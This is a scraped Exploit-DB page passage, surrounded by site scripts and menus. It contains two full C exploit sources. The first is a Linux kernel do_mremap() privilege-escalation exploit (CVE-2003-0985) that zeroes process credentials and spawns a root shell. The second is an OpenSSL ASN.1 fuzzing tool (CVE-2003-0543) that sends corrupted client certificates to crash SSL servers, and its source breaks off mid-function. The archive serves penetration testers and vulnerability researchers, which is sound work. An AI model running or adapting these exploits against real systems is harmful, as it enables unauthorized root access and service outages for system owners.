(typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 145
Linux Kernel 2.4.23/2.6.0 - 'do_mremap()' Bound Checking Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLinux Kernel 2.4.23/2.6.0 - 'do_mremap()' Bound Checking Privilege EscalationEDB-ID:145CVE:2003-0985EDB Verified:Author:Paul StarzetzType:localExploit:/Platform:LinuxDate:2004-01-15Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** Linux kernel mremap() bound checking bug exploit.** Bug found by Paul Starzetz <paul isec pl>** Copyright (c) 2004  iSEC Security Research. All Rights Reserved.** THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"* AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION* WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.*/#include <stdio.h>#include <stdlib.h>#include <errno.h>#include <string.h>#include <fcntl.h>#include <unistd.h>#include <syscall.h>#include <signal.h>#include <time.h>#include <sched.h>#include <sys/mman.h>#include <sys/stat.h>#include <sys/wait.h>#include <asm/page.h>#define MREMAP_MAYMOVE	1#define MREMAP_FIXED	2#define str(s) 	#s#define xstr(s) str(s)#define DSIGNAL		SIGCHLD#define CLONEFL		(DSIGNAL|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_VFORK)#define PAGEADDR	0x2000#define RNDINT		512#define NUMVMA		(3 * 5 * 257)#define NUMFORK		(17 * 65537)#define DUPTO		1000#define TMPLEN		256#define __NR_sys_mremap	163_syscall5(ulong, sys_mremap, ulong, a, ulong, b, ulong, c, ulong, d, ulong, e);unsigned long sys_mremap(unsigned long addr, unsigned long old_len, unsigned longnew_len,unsigned long flags, unsigned long new_addr);static volatile int pid = 0, ppid, hpid, *victim, *fops, blah = 0, dummy = 0, uid,gid;static volatile int *vma_ro, *vma_rw, *tmp;static volatile unsigned fake_file[16];void fatal(const char * msg){printf("\n");if (!errno) {fprintf(stderr, "FATAL: %s\n", msg);} else {perror(msg);}printf("\nentering endless loop");fflush(stdout);fflush(stderr);while (1) pause();}void kernel_code(void * file, loff_t offset, int origin){int i, c;int *v;if (!file)goto out;__asm__("movl	%%esp, %0" : : "m" (c));c &= 0xffffe000;v = (void *) c;for (i = 0; i < PAGE_SIZE / sizeof(*v) - 1; i++) {if (v[i] == uid && v[i+1] == uid) {i++; v[i++] = 0; v[i++] = 0; v[i++] = 0;}if (v[i] == gid) {v[i++] = 0; v[i++] = 0; v[i++] = 0; v[i++] = 0;break;}}out:dummy++;}void try_to_exploit(void){int v = 0;v += fops[0];v += fake_file[0];kernel_code(0, 0, v);lseek(DUPTO, 0, SEEK_SET);if (geteuid()) {printf("\nFAILED uid!=0"); fflush(stdout);errno =- ENOSYS;fatal("uid change");}printf("\n[+] PID %d GOT UID 0, enjoy!", getpid()); fflush(stdout);kill(ppid, SIGUSR1);setresuid(0, 0, 0);sleep(1);printf("\n\n"); fflush(stdout);execl("/bin/bash", "bash", NULL);fatal("burp");}void cleanup(int v){victim[DUPTO] = victim[0];kill(0, SIGUSR2);}void redirect_filp(int v){printf("\n[!] parent check race... "); fflush(stdout);if (victim[DUPTO] && victim[0] == victim[DUPTO]) {printf("SUCCESS, cought SLAB page!"); fflush(stdout);victim[DUPTO] = (unsigned) & fake_file;signal(SIGUSR1, &cleanup);kill(pid, SIGUSR1);} else {printf("FAILED!");}fflush(stdout);}int get_slab_objs(void){FILE * fp;int c, d, u = 0, a = 0;static char line[TMPLEN], name[TMPLEN];fp = fopen("/proc/slabinfo", "r");if (!fp)fatal("fopen");fgets(name, sizeof(name) - 1, fp);do {c = u = a =- 1;if (!fgets(line, sizeof(line) - 1, fp))break;c = sscanf(line, "%s %u %u %u %u %u %u", name, &u, &a, &d, &d, &d, &d);} while (strcmp(name, "size-4096"));fclose(fp);return c == 7 ? a - u : -1;}void unprotect(int v){int n, c = 1;*victim = 0;printf("\n[+] parent unprotected PTE "); fflush(stdout);dup2(0, 2);while (1) {n = get_slab_objs();if (n < 0)fatal("read slabinfo");if (n > 0) {printf("\n    depopulate SLAB #%d", c++);blah = 0; kill(hpid, SIGUSR1);while (!blah) pause();}if (!n) {blah = 0; kill(hpid, SIGUSR1);while (!blah) pause();dup2(0, DUPTO);break;}}signal(SIGUSR1, &redirect_filp);kill(pid, SIGUSR1);}void cleanup_vmas(void){int i = NUMVMA;while (1) {tmp = mmap((void *) (PAGEADDR - PAGE_SIZE), PAGE_SIZE, PROT_READ,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);if (tmp != (void *) (PAGEADDR - PAGE_SIZE)) {printf("\n[-] ERROR unmapping %d", i); fflush(stdout);fatal("unmap1");}i--;if (!i)break;tmp = mmap((void *) (PAGEADDR - PAGE_SIZE), PAGE_SIZE, PROT_READ|PROT_WRITE,MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);if (tmp != (void *) (PAGEADDR - PAGE_SIZE)) {printf("\n[-] ERROR unmapping %d", i); fflush(stdout);fatal("unmap2");}i--;if (!i)break;}}void catchme(int v){blah++;}void exitme(int v){_exit(0);}void childrip(int v){waitpid(-1, 0, WNOHANG);}void slab_helper(void){signal(SIGUSR1, &catchme);signal(SIGUSR2, &exitme);blah = 0;while (1) {while (!blah) pause();blah = 0;if (!fork()) {dup2(0, DUPTO);kill(getppid(), SIGUSR1);while (1) pause();} else {while (!blah) pause();blah = 0; kill(ppid, SIGUSR2);}}exit(0);}int main(void){int i, r, v, cnt;time_t start;srand(time(NULL) + getpid());ppid = getpid();uid = getuid();gid = getgid();hpid = fork();if (!hpid)slab_helper();fops = mmap(0, PAGE_SIZE, PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);if (fops == MAP_FAILED)fatal("mmap fops VMA");for (i = 0; i < PAGE_SIZE / sizeof(*fops); i++)fops[i] = (unsigned)&kernel_code;for (i = 0; i < sizeof(fake_file) / sizeof(*fake_file); i++)fake_file[i] = (unsigned)fops;vma_ro = mmap(0, PAGE_SIZE, PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);if (vma_ro == MAP_FAILED)fatal("mmap1");vma_rw = mmap(0, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);if (vma_rw == MAP_FAILED)fatal("mmap2");cnt = NUMVMA;while (1) {r = sys_mremap((ulong)vma_ro, 0, 0, MREMAP_FIXED|MREMAP_MAYMOVE, PAGEADDR);if (r == (-1)) {printf("\n[-] ERROR remapping"); fflush(stdout);fatal("remap1");}cnt--;if (!cnt) break;r = sys_mremap((ulong)vma_rw, 0, 0, MREMAP_FIXED|MREMAP_MAYMOVE, PAGEADDR);if (r == (-1)) {printf("\n[-] ERROR remapping"); fflush(stdout);fatal("remap2");}cnt--;if (!cnt) break;}victim = mmap((void*)PAGEADDR, PAGE_SIZE, PROT_EXEC|PROT_READ|PROT_WRITE,MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);if (victim != (void *) PAGEADDR)fatal("mmap victim VMA");v = *victim;*victim = v + 1;signal(SIGUSR1, &unprotect);signal(SIGUSR2, &catchme);signal(SIGCHLD, &childrip);printf("\n[+] Please wait...HEAVY SYSTEM LOAD!\n"); fflush(stdout);start = time(NULL);cnt = NUMFORK;v = 0;while (1) {cnt--;v--;dummy += *victim;if (cnt > 1) {__asm__("pusha				\n""movl %1, %%eax			\n""movl $("xstr(CLONEFL)"), %%ebx	\n""movl %%esp, %%ecx		\n""movl $120, %%eax		\n""int  $0x80			\n""movl %%eax, %0			\n""popa				\n": : "m" (pid), "m" (dummy));} else {pid = fork();}if (pid) {if (v <= 0 && cnt > 0) {float eta, tm;v = rand() % RNDINT / 2 + RNDINT / 2;tm = eta = (float)(time(NULL) - start);eta *= (float)NUMFORK;eta /= (float)(NUMFORK - cnt);printf("\r\t%u of %u [ %u %%  ETA %6.1f s ]          ",NUMFORK - cnt, NUMFORK, (100 * (NUMFORK - cnt)) / NUMFORK, eta - tm);fflush(stdout);}if (cnt) {waitpid(pid, 0, 0);continue;}if (!cnt) {while (1) {r = wait(NULL);if (r == pid) {cleanup_vmas();while (1) { kill(0, SIGUSR2); kill(0, SIGSTOP); pause(); }}}}}else {cleanup_vmas();if (cnt > 0) {_exit(0);}printf("\n[+] overflow done, the moment of truth..."); fflush(stdout);sleep(1);signal(SIGUSR1, &catchme);munmap(0, PAGE_SIZE);dup2(0, 2);blah = 0; kill(ppid, SIGUSR1);while (!blah) pause();munmap((void *)victim, PAGE_SIZE);dup2(0, DUPTO);blah = 0; kill(ppid, SIGUSR1);while (!blah) pause();try_to_exploit();while (1) pause();}}return 0;}// milw0rm.com [2004-01-15]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 146
OpenSSL ASN.1 < 0.9.6j/0.9.7b - Brute Forcer for Parsing Bugs - Multiple dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDOpenSSL ASN.1 < 0.9.6j/0.9.7b - Brute Forcer for Parsing BugsEDB-ID:146CVE:2003-0543EDB Verified:Author:Bram MatthysType:dosExploit:/Platform:MultipleDate:2003-10-09Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* Brute forcer for OpenSSL ASN.1 parsing bugs (<=0.9.6j <=0.9.7b)* written by Bram Matthys (Syzop) on Oct 9 2003.** This program sends corrupt client certificates to the SSL* server which will 1) crash it 2) create lots of error messages,* and/or 3) result in other "interresting" behavior.** I was able to crash my own ssl app in 5-15 attempts,* apache-ssl only generated error messages but after several hours* some childs went into some kind of eat-all-cpu-loop... so YMMV.** It's quite ugly but seems to compile at Linux/FreeBSD.*/#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <netdb.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <arpa/inet.h>#include <ctype.h>#include <string.h>#include <sys/signal.h>#include <arpa/nameser.h>#include <sys/time.h>#include <time.h>#include <errno.h>char buf[8192];/* This was simply sniffed from an stunnel session */const char dacrap[] ="\x16\x03\x00\x02\x47\x0b\x00\x02\x43\x00\x02\x40\x00\x02\x3d\x30\x82""\x02\x39\x30\x82\x01\xa2\xa0\x03\x02\x01\x02\x02\x01\x00\x30\x0d\x06""\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x04\x05\x00\x30\x57\x31\x0b\x30""\x09\x06\x03\x55\x04\x06\x13\x02\x50\x4c\x31\x13\x30\x11\x06\x03\x55""\x04\x08\x13\x0a\x53\x6f\x6d\x65\x2d\x53\x74\x61\x74\x65\x31\x1f\x30""\x1d\x06\x03\x55\x04\x0a\x13\x16\x53\x74\x75\x6e\x6e\x65\x6c\x20\x44""\x65\x76\x65\x6c\x6f\x70\x65\x72\x73\x20\x4c\x74\x64\x31\x12\x30\x10""\x06\x03\x55\x04\x03\x13\x09\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x30""\x1e\x17\x0d\x30\x33\x30\x36\x31\x32\x32\x33\x35\x30\x34\x39\x5a\x17""\x0d\x30\x34\x30\x36\x31\x31\x32\x33\x35\x30\x34\x39\x5a\x30\x57\x31""\x0b\x30\x09\x06\x03\x55\x04\x06\x13\x02\x50\x4c\x31\x13\x30\x11\x06""\x03\x55\x04\x08\x13\x0a\x53\x6f\x6d\x65\x2d\x53\x74\x61\x74\x65\x31""\x1f\x30\x1d\x06\x03\x55\x04\x0a\x13\x16\x53\x74\x75\x6e\x6e\x65\x6c""\x20\x44\x65\x76\x65\x6c\x6f\x70\x65\x72\x73\x20\x4c\x74\x64\x31\x12""\x30\x10\x06\x03\x55\x04\x03\x13\x09\x6c\x6f\x63\x61\x6c\x68\x6f\x73""\x74\x30\x81\x9f\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01""\x05\x00\x03\x81\x8d\x00\x30\x81\x89\x02\x81\x81\x00\xe6\x95\x5c\xc0""\xcb\x03\x78\xf1\x1e\xaa\x45\xb7\xa4\x10\xd0\xc1\xd5\xc3\x8c\xcc\xca""\x17\x7b\x48\x9a\x21\xf2\xfa\xc3\x25\x07\x0b\xb7\x69\x17\xca\x59\xf7""\xdf\x67\x7b\xf1\x72\xd5\x05\x61\x73\xe8\x70\xbf\xb9\xfa\xc8\x4b\x03""\x41\x62\x71\xf9\xf5\x4e\x28\xb8\x3b\xe4\x33\x76\x47\xcc\x1e\x04\x71""\xda\xc4\x0b\x05\x46\xf4\x52\x72\x99\x43\x36\xf7\x37\x6d\x04\x1c\x7a""\xde\x2a\x0c\x45\x4a\xb6\x48\x33\x3a\xad\xec\x16\xcc\xe7\x99\x58\xfd""\xef\x4c\xc6\xdd\x39\x76\xb6\x50\x76\x2a\x7d\xa0\x20\xee\xb4\x2c\xe0""\xd2\xc9\xa1\x2e\x31\x02\x03\x01\x00\x01\xa3\x15\x30\x13\x30\x11\x06""\x09\x60\x86\x48\x01\x86\xf8\x42\x01\x01\x04\x04\x03\x02\x06\x40\x30""\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x04\x05\x00\x03\x81\x81""\x00\x9f\xff\xa9\x93\x70\xb9\xae\x48\x47\x09\xa1\x11\xbf\x01\x34\xbf""\x1f\x1e\xed\x88\x3e\x57\xe0\x37\x72\x0d\xec\xc7\x21\x44\x12\x99\x3a""\xfa\xaf\x79\x57\xf4\x7f\x99\x68\x37\xb1\x17\x83\xd3\x51\x44\xbd\x50""\x67\xf8\xd6\xd0\x93\x00\xbb\x53\x3d\xe2\x3d\x34\xfc\xed\x60\x85\xea""\x67\x7f\x91\xec\xfa\xe3\xd8\x78\xa2\xf4\x61\xfa\x77\xa3\x3f\xe4\xb1""\x41\x95\x47\x23\x03\x1c\xbf\x2e\x40\x77\x82\xef\xa0\x17\x82\x85\x03""\x90\x35\x4e\x85\x0d\x0f\x4d\xea\x16\xf5\xce\x15\x21\x10\xf9\x56\xd0""\xa9\x08\xe5\xf9\x9d\x5c\x43\x75\x33\xe2\x16\x03\x00\x00\x84\x10\x00""\x00\x80\x6e\xe4\x26\x03\x97\xb4\x5d\x58\x70\x36\x98\x31\x62\xd4\xef""\x7b\x4e\x53\x99\xad\x72\x27\xaf\x05\xd4\xc9\x89\xca\x04\xf1\x24\xa4""\xa3\x82\xb5\x89\x3a\x2e\x8f\x3f\xf3\xe1\x7e\x52\x11\xb2\xf2\x29\x95""\xe0\xb0\xe9\x3f\x29\xaf\xc1\xcd\x77\x54\x6a\xeb\xf6\x81\x6b\xd5\xd6""\x0a\x3d\xc3\xff\x6f\x76\x4a\xf7\xc9\x61\x9f\x7b\xb3\x25\xe0\x2b\x09""\x53\xcf\x06\x1c\x82\x9c\x48\x37\xfa\x71\x27\x97\xec\xae\x6f\x4f\x75""\xb1\xa5\x84\x99\xf5\xed\x8c\xba\x0f\xd5\x33\x31\x61\x5d\x95\x77\x65""\x8d\x89\x0c\x7d\xa7\xa8\x95\x5a\xc7\xb8\x35\x16\x03\x00\x00\x86\x0f""\x00\x00\x82\x00\x80\x78\x1d\xbd\x86\xcb\x6e\x06\x88\x57\x9e\x3d\x21""\x7e\xca\xd1\x75\xff\x33\xef\x48\x4d\x88\x96\x84\x8c\x2f\xfb\x92\x1d""\x15\x28\xef\xe0\xd3\x4d\x20\xe9\xae\x6c\x5c\xed\x46\xc0\xef\x4e\xb4""\xe4\xcf\xe9\x73\xb8\xd2\x8b\xe6\x5e\xb9\x0c\x67\xbe\x17\x13\x31\x3f""\xe5\xe1\x9a\x2d\xfe\xb4\xd6\xdb\x8f\xbc\x15\x22\x10\x65\xe1\xad\x5f""\x00\xd0\x48\x8d\x4e\xa7\x08\xbd\x5c\x40\x77\xb8\xa9\xbe\x58\xb0\x15""\xd2\x4c\xc8\xa1\x79\x63\x25\xeb\xa1\x32\x61\x3b\x49\x82\xf1\x3a\x70""\x80\xf8\xdc\xf7\xf9\xfc\x50\xc7\xa2\x5d\xe4\x30\x8e\x09\x14\x03\x00""\x00\x01\x01\x16\x03\x00\x00\x40\xfe\xc2\x1f\x94\x7e\xf3\x0b\xd1\xe1""\x5c\x27\x34\x7f\x01\xe9\x51\xd3\x18\x33\x9a\x99\x48\x6e\x13\x6f\x82""\xb2\x2c\xa5\x7b\x36\x5d\x85\xf5\x17\xe3\x4f\x2a\x04\x15\x2d\x0e\x2f""\x2c\xf9\x1c\xf8\x9e\xac\xd5\x6c\x20\x81\xe5\x22\x54\xf1\xe1\xd0\xfd""\x64\x42\xfb\x34";#define CRAPLEN (sizeof(dacrap)-1)int send_hello(){int len;char *p = buf;*p++ = 22;				/* Handshake */PUTSHORT(0x0300, p);	/* SSL v3 */PUTSHORT(85, p);		/* Length will be 85 bytes */*p++ = 1;				/* Client hello */*p++ = 0;				/* Length: */PUTSHORT(81, p);		/* 81 bytes */PUTSHORT(0x0300, p);	/* SSL v3 */PUTLONG(0xffffffff, p);	/* Random.gmt_unix_time *//* Now 28 bytes of random data... (7x4bytes=28) */PUTLONG(0x11223344, p);PUTLONG(0x11223344, p);PUTLONG(0x11223344, p);PUTLONG(0x11223344, p);PUTLONG(0x11223344, p);PUTLONG(0x11223344, p);PUTLONG(0x11223344, p);*p++ = 0;				/* Session ID 0 */PUTSHORT(42, p);		/* Cipher Suites Length */PUTSHORT(0x16, p);PUTSHORT(0x13, p);PUTSHORT(0x0a, p);PUTSHORT(0x66, p);PUTSHORT(0x07, p);PUTSHORT(0x05, p);PUTSHORT(0x04, p);PUTSHORT(0x65, p);PUTSHORT(0x64, p);PUTSHORT(0x63, p);PUTSHORT(0x62, p);PUTSHORT(0x61, p);PUTSHORT(0x60, p);PUTSHORT(0x15, p);PUTSHORT(0x12, p);PUTSHORT(0x09, p);PUTSHORT(0x14, p);PUTSHORT(0x11, p);PUTSHORT(0x08, p);PUTSHORT(0x06, p);PUTSHORT(0x03, p);*p++ = 1;				/* Compresion method length: 1 */*p++ = 0;				/* (null) */len = p - buf;return len;}int send_crap(){memcpy(buf, dacrap, CRAPLEN);return CRAPLEN;}void corruptor(char *buf, int len){int cb, i, l;cb = rand()%15+1; /* bytes to corrupt */for (i=0; i < cb; i++){l = rand()%len;buf[l] = rand()%256;}}void diffit(){int i;printf("DIFF:\n");for (i=0; i < CRAPLEN; i++){if (buf[i] != dacrap[i])printf("Offset %d: 0x%x -> 0x%x\n", i, dacrap[i], buf[i]);}printf("*****\n");}int main(int argc, char *argv[]){struct sockaddr_in addr;int s, port = 0, first = 1, len;char *host = NULL;unsigned int seed;struct timeval tv;printf("OpenSSL ASN.1 brute forcer (Syzop/2003)\n\n");if (argc != 3) {fprintf(stderr, "Use: %s [ip] [port]\n", argv[0]);exit(1);}host = argv[1];port = atoi(argv[2]);if ((port < 1) || (port > 65535)) {fprintf(stderr, "Port out of range (%d)\n", port);exit(1);}gettimeofday(&tv, NULL);seed = (getpid() ^ tv.tv_sec) + (tv.tv_usec * 1000);printf("seed = %u\n", seed);srand(seed);memset(&addr, 0, sizeof(addr));signal(SIGPIPE, SIG_IGN); /* Ignore SIGPIPE */while(1){if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {fprintf(stderr, "Socket 